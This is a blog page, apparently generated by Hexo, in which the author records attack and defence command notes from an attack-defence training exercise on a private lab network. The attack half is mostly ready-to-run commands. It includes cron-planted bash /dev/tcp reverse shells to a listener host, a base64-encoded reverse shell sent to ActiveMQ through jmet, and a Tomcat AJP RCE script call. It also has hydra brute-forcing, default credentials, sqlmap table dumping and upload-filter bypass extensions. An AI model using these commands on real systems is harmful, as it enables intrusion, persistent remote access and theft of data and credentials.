@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"got17.cn","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="最后两天进行攻防演练实战。 结果还行，搞了个小米音箱，继续努力吧。 记了些脚本，以便快速攻防。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【网络安全1x0a】安恒厂家网络安全培训 --- day11、day12">
+<meta property="og:url" content="http://got17.cn/1082/index.html">
+<meta property="og:site_name" content="gaoteng&#39;s blog">
+<meta property="og:description" content="最后两天进行攻防演练实战。 结果还行，搞了个小米音箱，继续努力吧。 记了些脚本，以便快速攻防。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-07-14T14:55:08.000Z">
+<meta property="article:modified_time" content="2022-09-03T03:28:56.699Z">
+<meta property="article:author" content="gaoteng17">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="kali">
+<meta property="article:tag" content="vulhub">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://got17.cn/1082/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://got17.cn/1082/","path":"1082/","title":"【网络安全1x0a】安恒厂家网络安全培训 --- day11、day12"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【网络安全1x0a】安恒厂家网络安全培训 --- day11、day12 | gaoteng's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">gaoteng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#attack"><span class="nav-number">1.</span> <span class="nav-text">attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">1.1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">1.2.</span> <span class="nav-text">弱口令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0"><span class="nav-number">1.3.</span> <span class="nav-text">网站后台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%AB%E7%BD%91%E7%AB%99flag"><span class="nav-number">1.4.</span> <span class="nav-text">扫网站flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">1.5.</span> <span class="nav-text">爆破弱口令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.6.</span> <span class="nav-text">中间件漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql"><span class="nav-number">1.7.</span> <span class="nav-text">sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upload"><span class="nav-number">1.8.</span> <span class="nav-text">upload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#defence"><span class="nav-number">2.</span> <span class="nav-text">defence</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%B9%E5%AF%86%E7%A0%81"><span class="nav-number">2.1.</span> <span class="nav-text">改密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A0%E7%94%A8%E6%88%B7"><span class="nav-number">2.2.</span> <span class="nav-text">删用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B8%A2%E4%BA%BA"><span class="nav-number">2.3.</span> <span class="nav-text">踢人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">2.4.</span> <span class="nav-text">中间件漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%A1%B5%E6%BC%8F%E6%B4%9E-%E6%94%B9httpd-conf"><span class="nav-number">2.5.</span> <span class="nav-text">网页漏洞 改httpd.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%97%ADftp%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE"><span class="nav-number">2.6.</span> <span class="nav-text">关闭ftp匿名访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%97%A5%E5%BF%97%E6%9F%A5flag"><span class="nav-number">2.7.</span> <span class="nav-text">本地日志查flag</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="gaoteng17"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">gaoteng17</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/gaoteng17" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gaoteng17" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:gaoteng17@gmail.com" title="E-Mail → mailto:gaoteng17@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/5544866728" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5544866728" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://got17.cn/1082/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="gaoteng17">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【网络安全1x0a】安恒厂家网络安全培训 --- day11、day12 | gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【网络安全1x0a】安恒厂家网络安全培训 --- day11、day12
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-07-14 22:55:08" itemprop="dateCreated datePublished" datetime="2020-07-14T22:55:08+08:00">2020-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-03 11:28:56" itemprop="dateModified" datetime="2022-09-03T11:28:56+08:00">2022-09-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>最后两天进行攻防演练实战。</p>
+<p>结果还行，搞了个小米音箱，继续努力吧。</p>
+<p>记了些脚本，以便快速攻防。</p>
+<span id="more"></span>
+
+<h1 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><a target="_blank" rel="noopener" href="http://192.168.20.158/robots.txt">http://192.168.20.158/robots.txt</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.40.196/robots.txt">http://192.168.40.196/robots.txt</a></p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ssh chenyf@192.168.20.253</span><br><span class="line"></span><br><span class="line">ssh chenyf@192.168.40.200</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * root echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.30.123/110 0&gt;&amp;1&quot; | bash -i&#x27;</span> &gt;&gt; /etc/crontab</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * root echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.30.123/120 0&gt;&amp;1&quot; | bash -i&#x27;</span> &gt;&gt; /etc/crontab</span><br><span class="line"></span><br><span class="line">mysql -h 192.168.20.158 -u root -proot</span><br><span class="line"></span><br><span class="line">mysql -h 192.168.40.196 -u root -proot</span><br><span class="line"></span><br><span class="line">rdesktop -f -a 16 192.168.20.158:3389</span><br><span class="line"></span><br><span class="line">rdesktop -f -a 16 192.168.40.196:3389</span><br><span class="line"></span><br><span class="line">ftp 192.168.20.158</span><br><span class="line">anonymous</span><br><span class="line"></span><br><span class="line">ftp 192.168.40.196</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
+
+<h2 id="网站后台"><a href="#网站后台" class="headerlink" title="网站后台"></a>网站后台</h2><p><a target="_blank" rel="noopener" href="http://192.168.20.158/?/admin/">http://192.168.20.158/?/admin/</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.40.196/?/admin/">http://192.168.40.196/?/admin/</a></p>
+<h2 id="扫网站flag"><a href="#扫网站flag" class="headerlink" title="扫网站flag"></a>扫网站flag</h2><p>dirb <a target="_blank" rel="noopener" href="http://192.168.20.158/">http://192.168.20.158/</a> dict&#x2F;dirb_zidian.txt</p>
+<p>dirb <a target="_blank" rel="noopener" href="http://192.168.40.196/">http://192.168.40.196/</a> dict&#x2F;dirb_zidian.txt</p>
+<h2 id="爆破弱口令"><a href="#爆破弱口令" class="headerlink" title="爆破弱口令"></a>爆破弱口令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hydra -L dict/user.txt -P dict/pass.txt -vV -e ns 192.168.20.158 ssh -f</span><br><span class="line"></span><br><span class="line">hydra -L dict/user.txt -P dict/pass.txt -vV -e ns 192.168.40.196 ssh -f</span><br><span class="line"></span><br><span class="line">hydra 192.168.20.158 rdp -L dict/user.txt -P dict/pass.txt -V -f</span><br><span class="line"></span><br><span class="line">hydra 192.168.40.196 rdp -L dict/user.txt -P dict/pass.txt -V -f</span><br></pre></td></tr></table></figure>
+
+<h2 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><ol>
+<li>ActiveMQ</li>
+</ol>
+<p>抢时间提前访问：<br><a target="_blank" rel="noopener" href="http://192.168.20.253:8161/admin/browse.jsp?JMSDestination=event">http://192.168.20.253:8161/admin/browse.jsp?JMSDestination=event</a><br><a target="_blank" rel="noopener" href="http://192.168.40.200:8161/admin/browse.jsp?JMSDestination=event">http://192.168.40.200:8161/admin/browse.jsp?JMSDestination=event</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash –i &gt;&amp; /dev/tcp/192.168.30.123/4444 0&gt;&amp;1</span><br><span class="line">YmFzaCATaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMwLjEyMy80NDQ0IDA+JjE=</span><br><span class="line"></span><br><span class="line">java -jar jmet/jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;bash -c &#123;echo,YmFzaCATaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMwLjEyMy80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -Yp ROME 192.168.20.253 61616</span><br><span class="line"></span><br><span class="line">java -jar jmet/jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;bash -c &#123;echo,YmFzaCATaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMwLjEyMy80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -Yp ROME 192.168.40.200 61616</span><br><span class="line"></span><br><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>Ajp</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 2020-10487.py -p 8009 -f /WEB-INF/shell.jsp 192.168.20.253 --rce 1</span><br><span class="line"></span><br><span class="line">python3 2020-10487.py -p 8009 -f /WEB-INF/shell.jsp 192.168.40.200 --rce 1</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>Weblogic weak password</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://192.168.20.253:7001/console">http://192.168.20.253:7001/console</a><br><a target="_blank" rel="noopener" href="http://192.168.40.200:7001/console">http://192.168.40.200:7001/console</a></p>
+<p>weblogic<br>Oracle@123</p>
+<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>burp抓包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --dbs</span><br><span class="line">sqlmap -r sql.txt -D security --tables</span><br><span class="line">sqlmap -r sql.txt -D security -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>
+
+<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.PHP</span><br><span class="line">.php3 .phtml</span><br><span class="line">.php.</span><br><span class="line">. php</span><br><span class="line">.pphphp</span><br><span class="line"></span><br><span class="line">content/type:image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<h1 id="defence"><a href="#defence" class="headerlink" title="defence"></a>defence</h1><h2 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd chenyf</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://192.168.30.200/?/admin/">http://192.168.30.200/?/admin/</a></p>
+<h2 id="删用户"><a href="#删用户" class="headerlink" title="删用户"></a>删用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd 看最后一行</span><br><span class="line">deluser [user]</span><br></pre></td></tr></table></figure>
+
+<p>控制面板 - 用户账户 - 删除用户账户</p>
+<h2 id="踢人"><a href="#踢人" class="headerlink" title="踢人"></a>踢人</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w</span><br><span class="line">ps -ef | grep ssh 找到进程的[pid]</span><br><span class="line"><span class="built_in">kill</span> -9 [pid]</span><br></pre></td></tr></table></figure>
+
+<h2 id="中间件漏洞-1"><a href="#中间件漏洞-1" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><p>先 docker ps 记 id</p>
+<ol>
+<li>ActiveMQ</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -O /tmp/jetty-realm.properties http://192.168.30.123/jetty-realm.properties</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">cp</span> /tmp/jetty-realm.properties [docker_id]:/opt/apache-activemq-5.11.1/conf/jetty-realm.properties</span><br><span class="line"></span><br><span class="line">docker restart [docker_id]</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>Ajp</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -O /tmp/server.xml http://192.168.30.123/server.xml</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">cp</span> /tmp/server.xml [docker_id]:/usr/local/tomcat/conf/server.xml</span><br><span class="line"></span><br><span class="line">docker restart [docker_id]</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>Weblogic weak password</li>
+</ol>
+<p>改密码，麻溜点</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.30.100:7001/console">http://192.168.30.100:7001/console</a></p>
+<p>weblogic<br>Oracle@123</p>
+<h2 id="网页漏洞-改httpd-conf"><a href="#网页漏洞-改httpd-conf" class="headerlink" title="网页漏洞 改httpd.conf"></a>网页漏洞 改httpd.conf</h2><p>加：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ <span class="string">&quot;flag.txt&quot;</span>&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="关闭ftp匿名访问"><a href="#关闭ftp匿名访问" class="headerlink" title="关闭ftp匿名访问"></a>关闭ftp匿名访问</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf     //修改配置文件</span><br><span class="line">找到vsftpd.conf中的：</span><br><span class="line"></span><br><span class="line">anonymous_enable=<span class="built_in">yes</span>     //改为no;（<span class="built_in">yes</span>=允许、no=禁止）</span><br><span class="line">保存退出</span><br><span class="line"></span><br><span class="line">service vsftp restart     //重启FTP服务</span><br></pre></td></tr></table></figure>
+
+<h2 id="本地日志查flag"><a href="#本地日志查flag" class="headerlink" title="本地日志查flag"></a>本地日志查flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> [<span class="built_in">log</span>] | grep flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>:</span><br><span class="line"></span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/dmesg</span><br><span class="line">/var/log/auth.log</span><br><span class="line">/var/log/boot.log</span><br><span class="line">/var/log/daemon.log</span><br><span class="line">/var/log/dpkg.log</span><br><span class="line">/var/log/kern.log</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/maillog</span><br><span class="line">/var/log/user.log</span><br><span class="line">/var/log/Xorg.x.log</span><br><span class="line">/var/log/alternatives.log</span><br><span class="line">/var/log/btmp  =&gt;  last -f /var/log/btmp | more</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/utmp</span><br><span class="line">/var/log/cups</span><br><span class="line">/var/log/anaconda.log</span><br><span class="line">/var/log/yum.log</span><br><span class="line">/var/log/cron</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/faillog</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>apache下的<code>access.log</code>、<code>error.log</code>。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+              <a href="/tags/kali/" rel="tag"># kali</a>
+              <a href="/tags/vulhub/" rel="tag"># vulhub</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/1081/" rel="prev" title="【网络安全1x09】安恒厂家网络安全培训 --- day9、day10">
+                  <i class="fa fa-chevron-left"></i> 【网络安全1x09】安恒厂家网络安全培训 --- day9、day10
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/1083/" rel="next" title="【网络安全3x01】CTF8月竞赛学习----------取证">
+                  【网络安全3x01】CTF8月竞赛学习----------取证 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa-solid fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gaoteng17</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
